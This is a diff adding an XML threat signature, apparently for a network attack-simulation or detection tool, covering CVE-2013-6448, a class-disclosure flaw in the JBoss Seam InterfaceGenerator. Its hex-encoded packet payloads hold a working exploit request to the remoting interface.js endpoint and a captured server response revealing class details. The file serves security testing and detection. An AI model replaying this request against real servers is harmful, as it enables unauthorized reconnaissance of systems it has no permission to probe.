@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Red Hat JBoss Seam InterfaceGenerator Information Disclosure"/>
+    <EngDesc display="true" value="An information disclosure vulnerability exists in Red Hat JBoss Seam Framework. This is due to a design flaw in the InterfaceGenerator handler that allows it to expose details of all classes on the server's classpath. A remote unauthenticated attacker may exploit this vulnerability on a web application powered by the JBoss Seam Framework to determine which classes are deployed on the server."/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Red_Hat"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="JBoss_Seam"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="2.3.1_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140121-08"/>
+    <CVEID display="true" value="CVE-2013-6448"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="102344"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="96211e6f681000beb8d88dadc39feca4"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635367135356716634"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1401183017" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0F:8A" destMac="00:50:56:B4:0F:C3" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00CC" Identification="0517" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="CC42" srcIP="172.16.8.10" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="54637" destPort="$HTTPdestPort" SeqNumber="048FB695" AckNumber="55C47DCE" HeaderLength="08" WindowSize="0391" Checksum="B494" UrgentPointer="0000" Options="0101080A2041B38106965372" Payload="474554202F7365616D2D68656C6C6F776F726C642F7365616D2F7265736F757263652F72656D6F74696E672F696E746572666163652E6A733F6A6176612E696F2E46696C6520485454502F312E310D0A486F73743A203137322E31362E382E3136380D0A557365722D4167656E743A204D6F7A696C6C612F352E300D0A4163636570743A206170706C69636174696F6E2F786D6C0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0F:C3" destMac="00:50:56:B4:0F:8A" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="026D" Identification="2EBD" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A0FB" srcIP="$destIP" destIP="172.16.8.10" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="54637" SeqNumber="55C47DCE" AckNumber="048FB72D" HeaderLength="08" WindowSize="03CC" Checksum="7B6E" UrgentPointer="0000" Options="0101080A069653752041B381" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204A53455353494F4E49443D33656144575051683237774D5170745950536B5A467341773B20506174683D2F7365616D2D68656C6C6F776F726C640D0A436F6E74656E742D547970653A20746578742F6A6176617363726970740D0A436F6E74656E742D4C656E6774683A203336320D0A446174653A204D6F6E2C203237204A616E20323031342032313A31333A343120474D540D0A0D0A5365616D2E52656D6F74696E672E747970652E6A61766124696F2446696C65203D2066756E6374696F6E2829207B0A2020746869732E70617468203D20756E646566696E65643B0A20205365616D2E52656D6F74696E672E747970652E6A61766124696F2446696C652E70726F746F747970652E67657450617468203D2066756E6374696F6E2829207B2072657475726E20746869732E706174683B207D0A7D0A0A5365616D2E52656D6F74696E672E747970652E6A61766124696F2446696C652E5F5F6E616D65203D20226A6176612E696F2E46696C65223B0A5365616D2E52656D6F74696E672E747970652E6A61766124696F2446696C652E5F5F6D65746164617461203D205B0A20207B6669656C643A202270617468222C20747970653A2022737472227D5D3B0A0A5365616D2E52656D6F74696E672E726567697374657254797065285365616D2E52656D6F74696E672E747970652E6A61766124696F2446696C65293B0A0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
